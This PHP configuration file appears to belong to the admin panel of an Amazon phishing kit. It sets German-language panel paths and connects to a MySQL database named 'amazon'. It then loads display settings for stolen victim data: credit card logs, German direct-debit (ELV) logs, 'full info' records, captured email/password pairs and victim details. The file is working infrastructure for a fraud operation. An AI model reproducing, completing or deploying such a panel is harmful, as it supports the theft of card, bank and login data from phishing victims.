<?php
	ini_set( 'date.timezone', 'Europe/Berlin' ); 
	$date = date('H:i:s') . ' - ' . date('d.m.Y');
	
	/* PANEL PFADE -------------------------------------------------------------------------------------------------------------------------------------------------------------- */
	$adminPanelLogin = "login.php";
	$adminPanel = "adminpanel.php";
	/* ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ */
	
	/* MYSQL DATEN ------------------------------------------------------------------------------------------------------------------------------------------------------------ */
	$myHost = "localhost";
	$myUser = "root";
	$myPass = "";		
	$myDB = "amazon";
	$myTable = "db_amazon_content";
	
	$mySQLcon = new mysqli($myHost, $myUser, $myPass, $myDB);
	$mySQLcon->set_charset("utf8");
	/* ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- */
	
	
	/* PANEL EINSTELLUNGEN -------------------------------------------------------------------------------------------------------------------------------------------- */	
	if ($mySQLcon->connect_errno) {
		echo "Failed to connect to MySQL: (" . $mySQLcon->connect_errno . ") " . $mySQLcon->connect_error;
	}

	$stmt = $mySQLcon->prepare("SELECT `badWords`, `showLastLogs`, `show_Logs_CC`, `show_Logs_ELV`, `show_Logs_FI`, `show_Mail_Pass`, `collapse_in_cc`, `collapse_in_elv`, `collapse_in_fullinfo`, 
												`collapse_in_mailpass`, `collapse_in_cc_search`, `collapse_in_log_search`, `collapse_in_mail_search`, `adminUsername`, `adminPassword`, `show_vic_infos` FROM `panel_settings`");
	$stmt->execute();
	$res = $stmt->get_result();
	$row = $res->fetch_assoc();
	
	$badWords = htmlentities($row['badWords']);
	$showLastLogs = htmlentities($row['showLastLogs']);
	
	$show_Logs_CC = htmlentities($row['show_Logs_CC']);
	$show_Logs_ELV = htmlentities($row['show_Logs_ELV']);
	$show_Logs_FI = htmlentities($row['show_Logs_FI']);
	$show_Mail_Pass = htmlentities($row['show_Mail_Pass']);

	$collapse_in_cc = htmlentities($row['collapse_in_cc']);
	$collapse_in_elv = htmlentities($row['collapse_in_elv']);
	$collapse_in_fullinfo = htmlentities($row['collapse_in_fullinfo']);
	$collapse_in_mailpass = htmlentities($row['collapse_in_mailpass']);
	
	$collapse_in_cc_search = htmlentities($row['collapse_in_cc_search']);
	$collapse_in_log_search = htmlentities($row['collapse_in_log_search']);
	$collapse_in_mail_search = htmlentities($row['collapse_in_mail_search']);

	$adminUsername = htmlentities($row['adminUsername']);
	$adminPassword = htmlentities($row['adminPassword']);
	
	$show_vic_infos = htmlentities($row['show_vic_infos']);
	/* ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- */
?>